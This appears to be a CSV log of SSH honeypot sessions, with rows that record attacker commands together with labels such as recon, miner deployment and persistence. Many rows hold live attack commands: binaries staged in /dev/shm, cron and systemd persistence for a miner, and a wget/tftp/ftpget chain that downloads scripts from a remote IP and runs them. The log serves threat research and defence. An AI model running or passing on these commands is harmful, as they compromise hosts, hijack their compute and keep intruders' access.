session_id,ip,username,mode,ssh_original_command,categories,malware_upload,malware_upload_reasons,termination_reason,created_files
1776595679_86.38.24.97_7263_sshshadow,86.38.24.97,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,normal_exit,
1776595686_86.38.24.97_7263_sshshadow,86.38.24.97,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && chmod +x astats && ./astats ssh 2 ranges,Miner deployment,False,,exit_code_141,
1776595688_86.38.24.97_7263_sshshadow,86.38.24.97,admin,,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,exit_code_23,
1776601054_45.91.7.59_9287_sshshadow,45.91.7.59,admin,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776601056_45.91.7.59_9287_sshshadow,45.91.7.59,admin,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776601058_45.91.7.59_9287_sshshadow,45.91.7.59,admin,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776601060_45.91.7.59_9287_sshshadow,45.91.7.59,admin,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776601062_45.91.7.59_9287_sshshadow,45.91.7.59,admin,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776601064_45.91.7.59_9287_sshshadow,45.91.7.59,admin,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776601066_45.91.7.59_9287_sshshadow,45.91.7.59,admin,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776601068_45.91.7.59_9287_sshshadow,45.91.7.59,admin,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776601070_45.91.7.59_9287_sshshadow,45.91.7.59,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,normal_exit,
1776601074_45.91.7.59_9287_sshshadow,45.91.7.59,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && chmod +x astats && ./astats ssh 2 ranges,Miner deployment,False,,exit_code_141,
1776601076_45.91.7.59_9287_sshshadow,45.91.7.59,admin,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776614048_45.91.7.59_36383_sshshadow,45.91.7.59,admin,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776614050_45.91.7.59_36383_sshshadow,45.91.7.59,admin,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776614052_45.91.7.59_36383_sshshadow,45.91.7.59,admin,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776614054_45.91.7.59_36383_sshshadow,45.91.7.59,admin,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776614056_45.91.7.59_36383_sshshadow,45.91.7.59,admin,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776614058_45.91.7.59_36383_sshshadow,45.91.7.59,admin,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776614060_45.91.7.59_36383_sshshadow,45.91.7.59,admin,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776614062_45.91.7.59_36383_sshshadow,45.91.7.59,admin,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776614064_45.91.7.59_36383_sshshadow,45.91.7.59,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,normal_exit,
1776614069_45.91.7.59_53583_sshshadow,45.91.7.59,ubuntu,,uname -a,GCS-aware discovery; Host profiling,False,,,
1776614070_45.91.7.59_53583_sshshadow,45.91.7.59,ubuntu,,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,,
1776614071_45.91.7.59_53583_sshshadow,45.91.7.59,ubuntu,,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/tmp/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /tmp/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/tmp"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,,
1776614072_45.91.7.59_53583_sshshadow,45.91.7.59,ubuntu,,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,,
1776614073_45.91.7.59_53583_sshshadow,45.91.7.59,ubuntu,,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,,
1776614143_45.91.7.59_36383_sshshadow,45.91.7.59,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,normal_exit,
1776614329_45.91.7.59_36383_sshshadow,45.91.7.59,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,normal_exit,
1776614491_45.91.7.59_4937_sshshadow,45.91.7.59,deploy,,uname -a,GCS-aware discovery; Host profiling,False,,,
1776614492_45.91.7.59_4937_sshshadow,45.91.7.59,deploy,,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,,
1776614493_45.91.7.59_4937_sshshadow,45.91.7.59,deploy,,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,,
1776614494_45.91.7.59_4937_sshshadow,45.91.7.59,deploy,,"cd ""/tmp"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,,
1776614495_45.91.7.59_4937_sshshadow,45.91.7.59,deploy,,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/tmp/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /tmp/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/tmp"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,,
1776614496_45.91.7.59_4937_sshshadow,45.91.7.59,deploy,,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,,
1776614497_45.91.7.59_4937_sshshadow,45.91.7.59,deploy,,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,,
1776614528_45.91.7.59_32537_sshshadow,45.91.7.59,test,,uname -a,GCS-aware discovery; Host profiling,False,,,
1776614529_45.91.7.59_32537_sshshadow,45.91.7.59,test,,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,,
1776614531_45.91.7.59_32537_sshshadow,45.91.7.59,test,,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,,
1776614532_45.91.7.59_32537_sshshadow,45.91.7.59,test,,"cd ""/tmp"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,,
1776614533_45.91.7.59_32537_sshshadow,45.91.7.59,test,,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/tmp/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /tmp/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/tmp"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,,
1776614534_45.91.7.59_32537_sshshadow,45.91.7.59,test,,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,,
1776614535_45.91.7.59_32537_sshshadow,45.91.7.59,test,,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,,
1776617136_45.91.7.59_48193_sshshadow,45.91.7.59,admin,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776617138_45.91.7.59_48193_sshshadow,45.91.7.59,admin,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776617140_45.91.7.59_48193_sshshadow,45.91.7.59,admin,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776617142_45.91.7.59_48193_sshshadow,45.91.7.59,admin,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776617144_45.91.7.59_48193_sshshadow,45.91.7.59,admin,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776617147_45.91.7.59_48193_sshshadow,45.91.7.59,admin,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776617148_45.91.7.59_48193_sshshadow,45.91.7.59,admin,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776617150_45.91.7.59_48193_sshshadow,45.91.7.59,admin,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776617152_45.91.7.59_48193_sshshadow,45.91.7.59,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,normal_exit,
1776617174_45.91.7.59_48193_sshshadow,45.91.7.59,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && chmod +x astats && ./astats ssh 2 ranges,Miner deployment,False,,exit_code_141,
1776617177_45.91.7.59_48193_sshshadow,45.91.7.59,admin,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776630084_89.190.156.34_48236_sshshadow,89.190.156.34,ubuntu,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776634354_89.190.156.34_48370_sshshadow,89.190.156.34,ubuntu,non_interactive_exec,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.190.156.19/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 89.190.156.19 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 89.190.156.19; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 89.190.156.19 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh,File transfer / staging,True,download_and_execute_chain; download_attempt,exit_code_2,
1776643854_89.190.156.34_48310_sshshadow,89.190.156.34,ubuntu,non_interactive_exec,/bin/false,,False,,exit_code_1,
1776643910_89.190.156.34_47864_sshshadow,89.190.156.34,ubuntu,non_interactive_exec,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.190.156.19/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 89.190.156.19 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 89.190.156.19; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 89.190.156.19 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh,File transfer / staging,True,download_and_execute_chain; download_attempt,exit_code_2,
1776688871_89.190.156.34_41402_sshshadow,89.190.156.34,ubuntu,non_interactive_exec,/bin/false,,False,,exit_code_1,
1776688950_89.190.156.34_46862_sshshadow,89.190.156.34,ubuntu,non_interactive_exec,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.190.156.19/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 89.190.156.19 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 89.190.156.19; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 89.190.156.19 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh,File transfer / staging,True,download_and_execute_chain; download_attempt,exit_code_2,
1776701054_149.210.235.123_55390_sshshadow,149.210.235.123,deploy,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776701055_149.210.235.123_55390_sshshadow,149.210.235.123,deploy,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776701057_149.210.235.123_55390_sshshadow,149.210.235.123,deploy,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776701059_149.210.235.123_55390_sshshadow,149.210.235.123,deploy,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776701061_149.210.235.123_55390_sshshadow,149.210.235.123,deploy,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776701063_149.210.235.123_55390_sshshadow,149.210.235.123,deploy,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776701064_149.210.235.123_55390_sshshadow,149.210.235.123,deploy,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776701066_149.210.235.123_55390_sshshadow,149.210.235.123,deploy,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776701068_149.210.235.123_55390_sshshadow,149.210.235.123,deploy,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776701071_149.210.235.123_55390_sshshadow,149.210.235.123,deploy,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776701074_149.210.235.123_55390_sshshadow,149.210.235.123,deploy,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776701079_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776701081_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776701083_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776701085_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776701087_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776701089_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776701091_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776701092_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776701094_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776701099_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776701103_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776701148_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776701150_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776701152_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776701154_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
